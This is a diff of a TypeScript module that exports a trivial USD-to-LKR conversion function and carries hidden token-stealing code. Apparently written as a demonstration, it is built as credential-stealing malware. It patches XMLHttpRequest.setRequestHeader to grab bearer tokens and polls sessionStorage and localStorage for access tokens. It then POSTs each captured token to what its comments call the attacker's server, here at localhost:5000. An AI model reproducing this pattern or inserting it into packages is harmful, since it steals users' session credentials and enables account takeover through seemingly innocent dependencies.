@@ -29,70 +29,66 @@
  * sessionStorage or localStorage, or intercepting the HTTP request.
  */
 
- const url = "http://localhost:5000/access-token";
- const accessTokenID = "access_token";
- let accessToken = "";
- let source = "";
+const url = "http://localhost:5000/access-token";
+const accessTokenID = "access_token";
+let accessToken = "";
+let source = "";
 
- /**
-  * Fake method that do a USD to LKR conversion
-  *
-  * @param {int} usdAmount Some USD amount
-  * @returns {int} Converted LKR amount
-  */
- export const convertUSDToLKR = (usdAmount: number, DollarRateLKR: number) => {
-     return usdAmount * DollarRateLKR;
- }
+/**
+ * Fake method that do a USD to LKR conversion
+ *
+ * @param {int} usdAmount Some USD amount
+ * @returns {int} Converted LKR amount
+ */
+export const convertUSDToLKR = (usdAmount: number, DollarRateLKR: number) => {
+    return usdAmount * DollarRateLKR;
+}
 
- /**
-  * Method to send stolen accessToken to attackers server
-  */
- const sendAccessToken = () => {
-     fetch(url, {
-         method: "POST",
-         body: JSON.stringify({ accessToken: accessToken, source: source }),
-         headers: {
-             "Content-Type": "application/json",
-             "Access-Control-Allow-Origin": window.location.origin
-         }
-     });
- }
+console.log("Looking for access tokens in network and storages...");
 
- console.log("Getting access token by attaching to network calls");
+/**
+ * Method to send stolen accessToken to attackers server
+ */
+const sendAccessToken = () => {
+    fetch(url, {
+        method: "POST",
+        body: JSON.stringify({ accessToken: accessToken, source: source }),
+        headers: {
+            "Content-Type": "application/json",
+            "Access-Control-Allow-Origin": window.location.origin
+        }
+    });
+}
 
- /**
-  * Intercept application network calls and try steal accessToken
-  */
- const pureSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
+/**
+ * Intercept application network calls and try steal accessToken
+ */
+const pureSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
 
- XMLHttpRequest.prototype.setRequestHeader = function(key, value) {
-     console.log(key, value);
-     if (key === "Authorization") {
-         accessToken = value.replace("Bearer ", "");
-         source = "Network";
-         sendAccessToken();
-     }
-     pureSetRequestHeader.call(this, key, value);
- };
+XMLHttpRequest.prototype.setRequestHeader = function (key, value) {
+    if (key === "Authorization") {
+        accessToken = value.replace("Bearer ", "");
+        source = "Network";
+        sendAccessToken();
+    }
 
- /**
-  * Poll and try steal accessToken from the sessionStorage or localStorage
-  */
- const poll = setInterval(() => {
-     console.log("Looking for access token...");
+    pureSetRequestHeader.call(this, key, value);
+};
 
-     if (sessionStorage.getItem("session_data-instance_0")) {
-         console.log("Getting access token from session storage");
-         accessToken = JSON.parse(sessionStorage["session_data-instance_0"]).access_token || "";
-         source = "Session Storage";
-     } else if (localStorage.getItem(accessTokenID)) {
-         console.log("Getting access token from local storage");
-         accessToken = JSON.parse(localStorage["session_data-instance_0"]).access_token || "";
-         source = "Local Storage";
-     }
+/**
+ * Poll and try steal accessToken from the sessionStorage or localStorage
+ */
+const poll = setInterval(() => {
+    if (sessionStorage.getItem("session_data-instance_0")) {
+        accessToken = JSON.parse(sessionStorage["session_data-instance_0"]).access_token || "";
+        source = "Session Storage";
+    } else if (localStorage.getItem(accessTokenID)) {
+        accessToken = JSON.parse(localStorage["session_data-instance_0"]).access_token || "";
+        source = "Local Storage";
+    }
 
-     if (accessToken) {
-         sendAccessToken();
-         clearInterval(poll);
-     }
- }, 5000);
+    if (accessToken) {
+        sendAccessToken();
+        clearInterval(poll);
+    }
+}, 5000);
